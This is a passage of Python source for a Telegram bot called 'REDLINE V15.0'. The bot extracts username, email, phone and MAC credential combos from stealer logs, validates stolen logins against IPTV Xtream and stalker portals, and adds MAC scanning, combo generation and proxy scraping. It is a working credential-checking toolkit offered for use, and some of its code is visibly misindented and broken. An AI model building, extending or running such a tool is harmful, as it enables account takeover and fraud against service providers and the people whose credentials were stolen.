        Excludes emails and phone numbers
        """
        results = set()
        
        # Clean text
        text = re.sub(r'::+', ':', text)
        text = re.sub(r'[;,| ]+', ':', text)
        
        patterns = [
            # Standard username:password
            r'([a-zA-Z0-9._-]{3,30}):([^\s:]{4,})',
            # Username with underscores/dots
            r'([a-zA-Z][a-zA-Z0-9._-]{2,29}):([a-zA-Z0-9@#$%^&*!_\-]{4,})',
        ]
        
        for pattern in patterns:
            for match in re.finditer(pattern, text, re.MULTILINE):
                username = match.group(1).strip()
                password = match.group(2).strip()
                
                # Validation - exclude emails and phones
                if (
                    '@' not in username and
                    not username.isdigit() and
                    len(username) >= 3 and
                    len(password) >= 4
                ):
                    results.add(f"{username}:{password}")
        
        return results
    
    @staticmethod
    def extract_mp(text: str) -> Set[str]:
        """
        Extract M:P (Email:Password) combos
        Validates email format
        """
        results = set()
        
        # Clean text
        text = re.sub(r'::+', ':', text)
        text = re.sub(r'[;,| ]+', ':', text)
        
        # Email pattern
        email_pattern = r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}):([^\s:]{4,})'
        
        for match in re.finditer(email_pattern, text, re.MULTILINE):
            email = match.group(1).strip().lower()
            password = match.group(2).strip()
            
            # Validation
            if len(password) >= 4:
                results.add(f"{email}:{password}")
        
        return results
    
    @staticmethod
    def extract_m3u(text: str) -> Set[str]:
        """
        Extract M3U/M3U8 links
        Supports Xtream API and direct links
        """
        results = set()
        
        # Clean https to http
        text = text.replace("https://", "http://")
        
        # Pattern 1: Xtream API format
        xtream_pattern = r'http://[^\s\"]+/get\.php\?username=[^&\s]+&password=[^&\s]+(?:&type=m3u[_plus]*)?'
        
        for match in re.finditer(xtream_pattern, text, re.IGNORECASE):
            url = match.group(0)
            # Ensure type parameter
            if "&type=m3u" not in url:
                url = url + "&type=m3u_plus"
            results.add(url)
        
        # Pattern 2: Direct M3U8 links
        m3u8_pattern = r'http://[^\s\"]+\.m3u8(?:[^\s\"]*)'
        
        for match in re.finditer(m3u8_pattern, text, re.IGNORECASE):
            results.add(match.group(0))
        
        return results
    
    @staticmethod
    def extract_mac_key(text: str) -> Set[str]:
        """
        Extract MAC:KEY combos
        MAC address format validation
        """
        results = set()
        
        # MAC address patterns
        patterns = [
            # MAC with colons
            r'([0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}):([a-zA-Z0-9]{8,})',
            # MAC with hyphens
            r'([0-9A-Fa-f]{2}-[0-9A-Fa-f]{2}-[0-9A-Fa-f]{2}-[0-9A-Fa-f]{2}-[0-9A-Fa-f]{2}-[0-9A-Fa-f]{2}):([a-zA-Z0-9]{8,})',
        ]
        
        for pattern in patterns:
            for match in re.finditer(pattern, text, re.MULTILINE):
                mac = match.group(1).upper()
                key = match.group(2)
                results.add(f"{mac}:{key}")
        
        return results
    
    @staticmethod
    def extract_all(text: str) -> dict:
        """
        Extract ALL combo types
        Returns dictionary with each type
        """
        return {
            'np': RedlineExtractor.extract_np(text),
            'up': RedlineExtractor.extract_up(text),
            'mp': RedlineExtractor.extract_mp(text),
            'm3u': RedlineExtractor.extract_m3u(text),
            'mac': RedlineExtractor.extract_mac_key(text)
        }

# ============================================
# BOT USER INTERFACE
# ============================================

def get_main_menu() -> InlineKeyboardMarkup:
    """Create main menu keyboard - Modernized UI"""
    keyboard = [
        # EXTRACTION - Primary Feature
        [InlineKeyboardButton("📦 EXTRACTION", callback_data="noop")],
        [
            InlineKeyboardButton("💬 N:P", callback_data="mode_np"),
            InlineKeyboardButton("🔐 U:P", callback_data="mode_up")
        ],
        [
            InlineKeyboardButton("📧 M:P", callback_data="mode_mp"),
            InlineKeyboardButton("📺 M3U", callback_data="mode_m3u")
        ],
        [
            InlineKeyboardButton("🔑 MAC", callback_data="mode_mac"),
            InlineKeyboardButton("🎯 ALL", callback_data="mode_all")
        ],
        
        # QUICK ACTIONS - Fast Workflow
        [InlineKeyboardButton("⚡ QUICK ACTIONS", callback_data="noop")],
        [
            InlineKeyboardButton("🚀 Auto Check M3U", callback_data="check_m3u"),
            InlineKeyboardButton("⚡ Quick U:P Check", callback_data="up_xtream_auto")
        ],
        
        # TOOLS - Converters & Utilities
        [InlineKeyboardButton("🛠️ TOOLS & CONVERTERS", callback_data="noop")],
        [
            InlineKeyboardButton("🔄 M3U ⇄ Combo", callback_data="submenu_converters"),
            InlineKeyboardButton("🔀 MAC Tools", callback_data="submenu_mac")
        ],
        [
            InlineKeyboardButton("🔎 Search & Finder", callback_data="submenu_search"),
            InlineKeyboardButton("🧪 Advanced", callback_data="submenu_advanced")
        ],
        
        # AI ASSISTANT
        [InlineKeyboardButton("🤖 AI ASSISTANT", callback_data="noop")],
        [
            InlineKeyboardButton("💬 Ask AI", callback_data="ai_menu")
        ],
        
        # SETTINGS
        [InlineKeyboardButton("⚙️ SETTINGS", callback_data="noop")],
        [
            InlineKeyboardButton("⚙️ Settings", callback_data="settings")
        ]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_back_button() -> InlineKeyboardMarkup:
    """Create back button"""
    keyboard = [[InlineKeyboardButton("⬅️ Back to Menu", callback_data="back")]]
    return InlineKeyboardMarkup(keyboard)

def get_ai_menu() -> InlineKeyboardMarkup:
    """AI Assistant submenu"""
    status = ai_assistant.get_status()
    keyboard = [
        [InlineKeyboardButton(f"📍 AI ({status})", callback_data="noop")],
        [
            InlineKeyboardButton("💬 Ask Question", callback_data="ai_ask"),
            InlineKeyboardButton("🔍 Analyze File", callback_data="ai_analyze")
        ],
        [
            InlineKeyboardButton("📖 Explain Combo", callback_data="ai_explain_menu")
        ],
        [InlineKeyboardButton("⬅️ Back to Menu", callback_data="back")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_converters_menu() -> InlineKeyboardMarkup:
    """M3U Converters submenu"""
    keyboard = [
        [InlineKeyboardButton("📍 Converters & Tools", callback_data="noop")],
        [
            InlineKeyboardButton("🔄 M3U → Combo", callback_data="m3u_to_combo"),
            InlineKeyboardButton("🔄 Combo → M3U", callback_data="combo_to_m3u")
        ],
        [
            InlineKeyboardButton("🔀 M3U → MAC", callback_data="m3u_to_mac"),
            InlineKeyboardButton("↩️ MAC → M3U", callback_data="mac_to_m3u")
        ],
        [InlineKeyboardButton("⬅️ Back to Menu", callback_data="back")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_mac_tools_menu() -> InlineKeyboardMarkup:
    """MAC Tools submenu"""
    keyboard = [
        [InlineKeyboardButton("📍 MAC Address Tools", callback_data="noop")],
        [
            InlineKeyboardButton("🔑 MAC Host Check", callback_data="mac_host_single")
        ],
        [
            InlineKeyboardButton("🔀 M3U → MAC", callback_data="m3u_to_mac"),
            InlineKeyboardButton("↩️ MAC → M3U", callback_data="mac_to_m3u")
        ],
        [InlineKeyboardButton("⬅️ Back to Menu", callback_data="back")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_search_menu() -> InlineKeyboardMarkup:
    """Search & Finder tools submenu"""
    keyboard = [
        [InlineKeyboardButton("📍 Search & Finder Tools", callback_data="noop")],
        [
            InlineKeyboardButton("🔎 Keyword Searcher", callback_data="keyword_searcher"),
            InlineKeyboardButton("🗝️ StreamCreed Finder", callback_data="streamcreed_finder")
        ],
        [
            InlineKeyboardButton("🗂️ Panel Searcher", callback_data="panel_searcher"),
            InlineKeyboardButton("🌐 Proxy Finder", callback_data="proxy_finder")
        ],
        [
            InlineKeyboardButton("🌐 WHOIS + AI Trust", callback_data="whois_lookup")
        ],
        [InlineKeyboardButton("⬅️ Back to Menu", callback_data="back")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_advanced_menu() -> InlineKeyboardMarkup:
    """Advanced tools submenu"""
    keyboard = [
        [InlineKeyboardButton("📍 Advanced Tools", callback_data="noop")],
        [
            InlineKeyboardButton("🧪 Combo Generator", callback_data="combo_generator"),
            InlineKeyboardButton("🟢 Check Live Panels", callback_data="check_panels")
        ],
        [
            InlineKeyboardButton("⚡ U:P Xtream (Single)", callback_data="up_xtream_single"),
            InlineKeyboardButton("🔍 M3U Manual Check", callback_data="m3u_manual")
        ],
        [
            InlineKeyboardButton("📱 MAC Scanner (Auto)", callback_data="mac_scanner")
        ],
        [InlineKeyboardButton("⬅️ Back to Menu", callback_data="back")]
    ]
    return InlineKeyboardMarkup(keyboard)

# ============================================
# BOT COMMAND HANDLERS
# ============================================

async def health_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not allowed_chat(update):
        try:
            chat = update.effective_chat
            logger.info(f"Blocked callback from chat type={getattr(chat,'type',None)} id={getattr(chat,'id',None)}")
        except Exception:
            pass
        return
    await update.effective_message.reply_text("OK", quote=True)

async def id_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat = update.effective_chat
    await update.effective_message.reply_text(f"Chat ID: {getattr(chat,'id',None)}", quote=True)

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not allowed_chat(update):
        return
    await update.effective_message.reply_html(
        "🔥 <b>REDLINE V15.0</b>\n"
        "Use the menu buttons to run tools.\n"
        "Upload files in the channel to start batch flows."
    )

# ============================================
# AI COMMAND HANDLERS
# ============================================

async def ai_chat(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """AI chat command: /ai <your question>"""
    if not allowed_chat(update):
        return
    
    if not context.args:
        await update.message.reply_html(
            "🤖 <b>AI Assistant</b>\n\n"
            "<b>Usage:</b> <code>/ai your question here</code>\n\n"
            "<b>Examples:</b>\n"
            "• <code>/ai how do I check M3U links?</code>\n"
            "• <code>/ai what's the difference between U:P and M:P?</code>\n"
            "• <code>/ai explain MAC addresses</code>\n\n"
            "💡 Ask me anything about IPTV, combos, or bot features!"
        )
        return
    
    question = ' '.join(context.args)
    
    # Show typing indicator
    await update.message.chat.send_action(ChatAction.TYPING)
    
    # Get AI response
    answer = await ai_assistant.help_command(question)
    
    await update.message.reply_html(
        f"🤖 <b>AI Assistant:</b>\n\n{answer}"
    )

async def ai_analyze_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Set mode to analyze next file with AI"""
    if not allowed_chat(update):
        return
    
    if not ai_assistant.enabled:
        await update.message.reply_html(
            "❌ <b>AI not available</b>\n\n"
            "Please install: <code>pip install google-generativeai</code>\n"
            "And set GEMINI_API_KEY environment variable"
        )
        return
    
    context.user_data.clear()
    context.user_data['mode'] = 'ai_analyze'
    
    await update.message.reply_html(
        "🤖 <b>AI File Analyzer</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "📤 <b>Send a file to analyze:</b>\n"
        "• Text files with combos\n"
        "• M3U playlists\n"
        "• Log files\n\n"
        "🧠 AI will provide:\n"
        "✅ File type & format\n"
        "✅ Quality assessment\n"
        "✅ Content summary\n"
        "✅ Recommendations"
    )

async def ai_explain_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Explain a combo with AI"""
    if not allowed_chat(update):
        return
    
    if not context.args:
        await update.message.reply_html(
            "🤖 <b>AI Combo Explainer</b>\n\n"
            "<b>Usage:</b> <code>/explain your_combo_here</code>\n\n"
            "<b>Examples:</b>\n"
            "• <code>/explain user123:pass456</code>\n"
            "• <code>/explain http://server.com/get.php?username=test&password=123</code>\n"
            "• <code>/explain +1234567890:password</code>\n\n"
            "🧠 AI will explain what it is and how to use it!"
        )
        return
    
    combo = ' '.join(context.args)
    
    # Show typing indicator
    await update.message.chat.send_action(ChatAction.TYPING)
    
    # Get AI explanation
    explanation = await ai_assistant.explain_combo(combo)
    
    await update.message.reply_html(
        f"🤖 <b>Explanation:</b>\n\n{explanation}"
    )

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command - show welcome and main menu - ALL ENGLISH"""
    if not allowed_chat(update):
        try:
            chat = update.effective_chat
            logger.info(f"Blocked /start from chat type={getattr(chat,'type',None)} id={getattr(chat,'id',None)}")
        except Exception:
            pass
        return
    if update.effective_chat and not _allow_rate(update.effective_chat.id):
        return
    user = update.effective_user
    
    welcome_text = (
        f"👋 <b>Welcome {user.first_name}!</b>\n\n"
        "🔥 <b>REDLINE V15.0 Enhanced</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "⚡ <b>Quick Start:</b>\n"
        "1️⃣ Choose extraction format\n"
        "2️⃣ Upload your file\n"
        "3️⃣ Get results instantly!\n\n"
        "💡 <i>Tip: Try Quick Actions for faster workflow</i>"
    )
    
    await update.effective_message.reply_html(
        welcome_text,
        reply_markup=get_main_menu()
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle all button callbacks - ALL ENGLISH"""
    query = update.callback_query
    await query.answer()
    if not allowed_chat(update):
        return
    if update.effective_chat and not _allow_rate(update.effective_chat.id):
        return
    mode = context.user_data.get('mode', '')
    data = query.data
    
    # No-op for section headers
    if data == "noop":
        return

    # Back to main
    if data == "back":
        context.user_data.clear()
        user = query.from_user
        await query.edit_message_text(
            f"👋 <b>Welcome back, {user.first_name}!</b>\n\n"
            "🔥 <b>REDLINE V15.0 Enhanced</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "⚡ <b>Quick Start:</b>\n"
            "1️⃣ Choose extraction format\n"
            "2️⃣ Upload your file\n"
            "3️⃣ Get results instantly!\n\n"
            "💡 <i>Tip: Try Quick Actions for faster workflow</i>",
            parse_mode='HTML',
            reply_markup=get_main_menu()
        )
        return
    
    # === Submenus ===
    if data == "submenu_converters":
        await query.edit_message_text(
            "🔄 <b>M3U Converters & Tools</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "Convert between different IPTV formats:",
            parse_mode='HTML',
            reply_markup=get_converters_menu()
        )
        return
    
    if data == "submenu_mac":
        await query.edit_message_text(
            "🔑 <b>MAC Address Tools</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "MAC-based IPTV tools and converters:",
            parse_mode='HTML',
            reply_markup=get_mac_tools_menu()
        )
        return
    
    if data == "submenu_search":
        await query.edit_message_text(
            "🔎 <b>Search & Finder Tools</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "Find and analyze IPTV resources:\n"
            "• 🤖 AI-powered WHOIS trust analysis\n"
            "• Search panels, proxies & keywords\n"
            "• StreamCreed pattern detection",
            parse_mode='HTML',
            reply_markup=get_search_menu()
        )
        return
    
    if data == "submenu_advanced":
        await query.edit_message_text(
            "🧪 <b>Advanced Tools</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "Expert-level IPTV utilities:",
            parse_mode='HTML',
            reply_markup=get_advanced_menu()
        )
        return
    
    # === AI Assistant Menu ===
    if data == "ai_menu":
        status = ai_assistant.get_status()
        # Prepare status message
        if ai_assistant.enabled:
            ai_info = "🤖 Advanced AI Support\n⚡ Real-time analysis\n🎯 Smart recommendations"
        else:
            ai_info = "⚠️ AI Support temporarily unavailable. Contact administrator."
        
        await query.edit_message_text(
            f"🤖 <b>AI Assistant</b>\n"
            f"📊 Status: {status}\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "💡 <b>AI-Powered Features:</b>\n"
            "• Ask questions\n"
            "• Analyze files with AI\n"
            "• Get combo explanations\n"
            "• Auto-detect file types\n"
            "• Quality scoring\n\n"
            f"{ai_info}",
            parse_mode='HTML',
            reply_markup=get_ai_menu()
        )
        return
    
    if data == "ai_ask":
        await query.edit_message_text(
            "🤖 <b>Ask AI Assistant</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "💬 <b>Send your question as a message:</b>\n\n"
            "<b>Examples:</b>\n"
            "• How do I check M3U links?\n"
            "• What's the difference between U:P and M:P?\n"
            "• Explain MAC addresses\n\n"
            "<i>Or use command:</i> <code>/ai your question</code>",
            parse_mode='HTML',
            reply_markup=get_back_button()
        )
        return
    
    if data == "ai_analyze":
        await ai_analyze_cmd(update, context)
        return
    
    if data == "ai_explain_menu":
        await query.edit_message_text(
            "🤖 <b>AI Combo Explainer</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "📖 <b>Send a combo to explain:</b>\n\n"
            "<b>Examples:</b>\n"
            "• user123:pass456\n"
            "• http://server.com/get.php?username=test\n"
            "• +1234567890:password\n\n"
            "<i>Or use command:</i> <code>/explain your_combo</code>",
            parse_mode='HTML',
            reply_markup=get_back_button()
        )
        return

    # === Settings ===
    if data == "settings":
        context.user_data.clear()
        context.user_data['mode'] = 'settings'
        s = GLOBAL_SETTINGS
        txt = (
            "<b>⚙️ Settings</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Proxy: <b>{'ON' if s.get('proxy_enabled') else 'OFF'}</b> | <code>{s.get('proxy_value') or '-'}</code>\n"
            f"Include Channels (Auto): <b>{'ON' if s.get('include_channels_auto') else 'OFF'}</b>\n"
            f"Workers: <b>{s.get('workers')}</b>\n"
            f"M3U Limit: <b>{s.get('m3u_limit')}</b> | Combos Limit: <b>{s.get('combo_limit')}</b>\n\n"
            "Use buttons below to toggle or set values."
        )
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔌 Proxy ON/OFF", callback_data="settings_toggle_proxy"), InlineKeyboardButton("✏️ Set Proxy", callback_data="settings_set_proxy")],
            [InlineKeyboardButton("📺 Channels (Auto) ON/OFF", callback_data="settings_toggle_channels")],
            [InlineKeyboardButton("👷 Workers: 6", callback_data="settings_workers_6"), InlineKeyboardButton("12", callback_data="settings_workers_12"), InlineKeyboardButton("20", callback_data="settings_workers_20")],
            [InlineKeyboardButton("⬅️ Back", callback_data="back")]
        ])
        await query.edit_message_text(txt, parse_mode='HTML', reply_markup=kb)
        return

    if data.startswith("settings_workers_"):
        try:
            w = int(data.split('_')[-1])
            GLOBAL_SETTINGS['workers'] = w
            save_settings()
        except Exception:
            pass
        await query.answer("Workers updated")
        await query.message.reply_text("⚙️ Settings updated. Open Settings again to view.")
        return

    if data == "settings_toggle_proxy":
        GLOBAL_SETTINGS['proxy_enabled'] = not GLOBAL_SETTINGS.get('proxy_enabled')
        save_settings()
        await query.answer("Proxy toggled")
        await query.message.reply_text("🔌 Proxy toggled. Open Settings to view.")
        return

    if data == "settings_set_proxy":
        context.user_data.clear()
        context.user_data['mode'] = 'settings_set_proxy'
        await query.edit_message_text(
            "<b>✏️ Set Proxy</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "Send proxy as <code>host:port</code> or full URL (e.g., <code>http://host:port</code> or <code>socks5://host:port</code>).",
            parse_mode='HTML',
            reply_markup=get_back_button()
        )
        return

    if data == "settings_toggle_channels":
        GLOBAL_SETTINGS['include_channels_auto'] = not GLOBAL_SETTINGS.get('include_channels_auto')
        save_settings()
        await query.answer("Channels (Auto) toggled")
        await query.message.reply_text("📺 Include Channels in Auto toggled.")
        return

    # === Phase 3: U:P Xtream Auto (batch) ===
    if data == "up_xtream_auto":
        context.user_data.clear()
        context.user_data['mode'] = 'up_xtream_auto'
        context.user_data['step'] = 'ask_host'
        await query.edit_message_text(
            "<b>⚡ U:P Xtream Check (Auto)</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "📝 Send IPTV host (with port). Example: <code>http://example.com:8080</code>",
            parse_mode='HTML',
            reply_markup=get_back_button()
        )
        return
    
    # === MAC Scanner (batch) ===
    if data == "mac_scanner":
        context.user_data.clear()
        context.user_data['mode'] = 'mac_scanner'
        context.user_data['step'] = 'ask_host'
        await query.edit_message_text(
            "<b>📱 MAC Scanner (Auto)</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "📝 Send IPTV host (with port)\n"
            "Example: <code>http://example.com:8080</code>\n\n"
            "⚡ <b>Features:</b>\n"
            "• Batch MAC testing\n"
            "• Auto portal detection\n"
            "• Progress tracking",
            parse_mode='HTML',
            reply_markup=get_back_button()
        )
        return

    # === Phase 2: WHOIS Lookup ===
    if data == "whois_lookup":
        context.user_data.clear()
        context.user_data['mode'] = 'whois_lookup'
        ai_status = "✅ Enabled" if ai_assistant.enabled else "❌ Disabled"
        await query.edit_message_text(
            f"<b>🌐 WHOIS Lookup + AI Trust Analysis</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🤖 AI Trust Scoring: {ai_status}\n\n"
            f"📝 Send IP or domain:\n"
            f"• <code>8.8.8.8</code> (IP)\n"
            f"• <code>example.com</code> (Domain)\n\n"
            f"💡 AI will analyze trust, age, location & more!",
            parse_mode='HTML',
            reply_markup=get_back_button()
        )
        return

    # === Phase 2: Keyword Searcher ===
    if data == "keyword_searcher":
        context.user_data.clear()
        context.user_data['mode'] = 'keyword_searcher'
        await query.edit_message_text(
            "<b>🔎 Logs Keyword Searcher</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "📤 Send log/text file first, then send keywords (comma separated).",
            parse_mode='HTML',
            reply_markup=get_back_button()
        )
        return

    # === Phase 2: StreamCreed Finder ===
    if data == "streamcreed_finder":
        context.user_data.clear()
        context.user_data['mode'] = 'streamcreed_finder'
        await query.edit_message_text(
            "<b>🗝️ StreamCreed Key Finder</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "📤 Send log/text file to scan for keys.",
            parse_mode='HTML',
            reply_markup=get_back_button()
        )
        return

    # === Phase 2: Proxy Finder ===
    if data == "proxy_finder":
        context.user_data.clear()
        context.user_data['mode'] = 'proxy_finder'
        await query.edit_message_text(
            "<b>🌐 Proxy Finder</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "⏳ Collecting proxies from trusted sources...",
            parse_mode='HTML'
        )
        # Fetch and validate in parallel
        proxies, working = ProxyFinder.fetch_and_validate(max_fetch=200, validate_top=50, workers=20, timeout=5)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        result_filename = f"PROXIES_{timestamp}.txt"
        result_path = os.path.join(TEMP_DIR, result_filename)
        with open(result_path, 'w', encoding='utf-8') as f:
            f.write(f"# Proxy Finder\n# Total scraped: {len(proxies)} | Working (tested): {len(working)}\n\n")
            if working:
                f.write("# === WORKING (tested) ===\n")
                for w in working:
                    f.write(w + "\n")
                f.write("\n")
            f.write("# === ALL SCRAPED ===\n")
            for p in proxies:
                f.write(p + "\n")
        with open(result_path, 'rb') as f:
            await query.edit_message_caption(
                caption=(
                    f"✅ <b>Proxy Finder Complete!</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📊 Scraped: {len(proxies)} • Working: {len(working)}"
                ),
                parse_mode='HTML'
            ) if False else None
        # Send as new message (edit_message_caption may not apply)
        with open(result_path, 'rb') as f:
            await query.message.reply_document(
                document=f,
                filename=result_filename,
                caption=(
                    f"✅ <b>Proxy Finder Complete!</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📊 Scraped: {len(proxies)} • Working: {len(working)}"
                ),
                parse_mode='HTML',
                reply_markup=get_main_menu()
            )
        os.remove(result_path)
        context.user_data.clear()
        return
    

    # PHASE 3: U:P Xtream Single (host then user:pass)
    if mode == 'up_xtream_single':
        step = context.user_data.get('step')
        if step == 'ask_host':
            host = update.message.text.strip()
            if not host.startswith(('http://','https://')):
                await update.message.reply_html("❌ <b>Invalid host</b>\nExample: <code>http://example.com:8080</code>")
                return
            context.user_data['host'] = host.rstrip('/')
            context.user_data['step'] = 'ask_combo'
            await update.message.reply_html(
                "✅ Host saved!\n\n📝 Now send combo as <code>username:password</code>"
            )
            return
        elif step == 'ask_combo':
            combo = update.message.text.strip()
            if ':' not in combo:
                await update.message.reply_html("❌ <b>Invalid format</b>. Use <code>username:password</code>")
                return
            username, password = combo.split(':', 1)
            host = context.user_data.get('host')
            status_msg = await update.message.reply_html("⏳ <b>Checking Xtream...</b>")
            ok = False
            info = ''
            if HAS_REQUESTS:
                try:
                    url = f"{host}/player_api.php?username={username}&password={password}"
                    r = Net.get(url, timeout=8, allow_redirects=True, proxies=get_proxies())
                    if r.status_code == 200:
                        ok = True
                        info = (r.text or '')[:400]
                    else:
                        info = f"HTTP {r.status_code}"
                except Exception as e:
                    info = f"Error: {str(e)}"
            caption = (
                "✅ <b>Valid</b>" if ok else "❌ <b>Invalid</b>"
            ) + f"\nHost: <code>{host}</code>\nUser: <code>{username}</code>\n"
            await status_msg.edit_text(caption, parse_mode='HTML')
            context.user_data.clear()
            return

    # PHASE 3: M3U Manual (single URL)
    if mode == 'm3u_manual':
        url = update.message.text.strip()
        if not url.startswith(('http://','https://')):
            await update.message.reply_html("❌ <b>Invalid URL</b>")
            return
        status_msg = await update.message.reply_html("⏳ <b>Probing M3U...</b>")
        try:
            await context.bot.send_chat_action(chat_id=update.effective_chat.id, action=ChatAction.TYPING)
        except Exception:
            pass
        ok, info, err = M3UProbe.probe(url, timeout=8, proxies=get_proxies())
        if ok:
            try:
                ch = M3UProbe.fetch_first_group(info.get('m3u',''), timeout=5, proxies=get_proxies(), max_kb=256)
                if ch:
                    info['channels'] = ch
            except Exception:
                pass
            block = M3UProbe.format_manual_block(info)
            await status_msg.edit_text(block)
        else:
            await status_msg.edit_text(f"❌ Failed: {err}")
        context.user_data.clear()
        return

    # Settings: set proxy value (text input)
    if mode == 'settings_set_proxy':
        pv = (update.message.text or '').strip()
        GLOBAL_SETTINGS['proxy_value'] = pv
        save_settings()
        await update.message.reply_html("✅ <b>Proxy value saved.</b>\nOpen ⚙️ Settings to verify.")
        context.user_data.clear()
        return

    # PHASE 3: MAC → M3U (ask host then mac, build m3u)
    if mode == 'mac_to_m3u':
        step = context.user_data.get('step')
        if step == 'ask_host':
            host = update.message.text.strip()
            if not host.startswith(('http://','https://')):
                await update.message.reply_html("❌ <b>Invalid host</b>\nExample: <code>http://example.com:8080</code>")
                return
            context.user_data['host'] = host.rstrip('/')
            context.user_data['step'] = 'ask_mac'
            await update.message.reply_html(
                "✅ Host saved!\n\n📝 Now send MAC address (format: <code>00:1A:79:xx:xx:xx</code>)"
            )
            return
        elif step == 'ask_mac':
            mac = update.message.text.strip().upper()
            if not re.match(r"(?i)^[0-9A-F]{2}(:[0-9A-F]{2}){5}$", mac):
                await update.message.reply_html("❌ <b>Invalid MAC format</b>")
                return
            host = context.user_data.get('host')
            status_msg = await update.message.reply_html("⏳ <b>Building M3U from MAC...</b>")
        try:
            await context.bot.send_chat_action(chat_id=update.effective_chat.id, action=ChatAction.UPLOAD_DOCUMENT)
        except Exception:
            pass
            channels: List[Dict] = []
            error = ''
            if HAS_REQUESTS:
                channels, error = MACConverter.mac_to_m3u(host, mac)
            if error:
                await status_msg.edit_text(f"❌ {error}")
                context.user_data.clear()
                return
            if not channels:
                await status_msg.edit_text("❌ No channels returned")
                context.user_data.clear()
                return
            # Try fetch profile for expiry
            prof = MACConverter.mac_profile(host, mac)
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            result_filename = f"MAC_TO_M3U_{timestamp}.m3u"
            result_path = os.path.join(TEMP_DIR, result_filename)
            with open(result_path, 'w', encoding='utf-8') as f:
                f.write('#EXTM3U\n')
                if prof.get('expires'):
                    f.write(f"# EXPIRES: {prof['expires']}\n")
                for ch in channels:
                    name = ch.get('name') or f"CH-{ch.get('id','')}"
                    group = ch.get('group') or 'Unknown'
                    url = ch.get('url') or ''
                    if not url:
                        continue
                    f.write(f"#EXTINF:-1 group-title=\"{group}\",{name}\n")
                    f.write(url + "\n")
            with open(result_path, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=result_filename,
                    caption=(
                        f"✅ <b>MAC → M3U Complete</b>\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                        f"📊 Channels: {len(channels):,}"
                    ),
                    parse_mode='HTML',
                    reply_markup=get_main_menu()
                )
            await status_msg.delete()
            os.remove(result_path)
            context.user_data.clear()
            return

    # PHASE 3: MAC Host Single (host then mac)
    if mode == 'mac_host_single':
        step = context.user_data.get('step')
        if step == 'ask_host':
            host = update.message.text.strip()
            if not host.startswith(('http://','https://')):
                await update.message.reply_html("❌ <b>Invalid host</b>\nExample: <code>http://example.com:8080</code>")
                return
            context.user_data['host'] = host.rstrip('/')
            context.user_data['step'] = 'ask_mac'
            await update.message.reply_html(
                "✅ Host saved!\n\n📝 Now send MAC address (format: <code>00:1A:79:xx:xx:xx</code>)"
            )
            return
        elif step == 'ask_mac':
            mac = update.message.text.strip().upper()
            if not re.match(r"(?i)^[0-9A-F]{2}(:[0-9A-F]{2}){5}$", mac):
                await update.message.reply_html("❌ <b>Invalid MAC format</b>")
                return
            host = context.user_data.get('host')
            status_msg = await update.message.reply_html("⏳ <b>Checking MAC host...</b>")
            ok = False
            detail = ''
            if HAS_REQUESTS:
                try:
                    # Quick handshake check
                    base = host
                    url = f"{base}/portal.php?action=handshake&type=stb&token=&JsHttpRequest=1-xml"
                    r = Net.get(url, timeout=8, allow_redirects=False, proxies=get_proxies())
                    ok = (r.status_code == 200)
                    detail = (r.text or '')[:200]
                except Exception as e:
                    detail = f"Error: {str(e)}"
            await status_msg.edit_text(
                ("✅ <b>Reachable</b>" if ok else "❌ <b>Unreachable</b>") + f"\nHost: <code>{host}</code>\nMAC: <code>{mac}</code>",
                parse_mode='HTML'
            )
            context.user_data.clear()
            return
    
    # MAC Scanner (batch) - handle host input
    if mode == 'mac_scanner' and context.user_data.get('step') == 'ask_host':
        host = update.message.text.strip()
        
        # Validate and normalize host
        if not host:
            await update.message.reply_html("❌ <b>Invalid host</b>")
            return
        
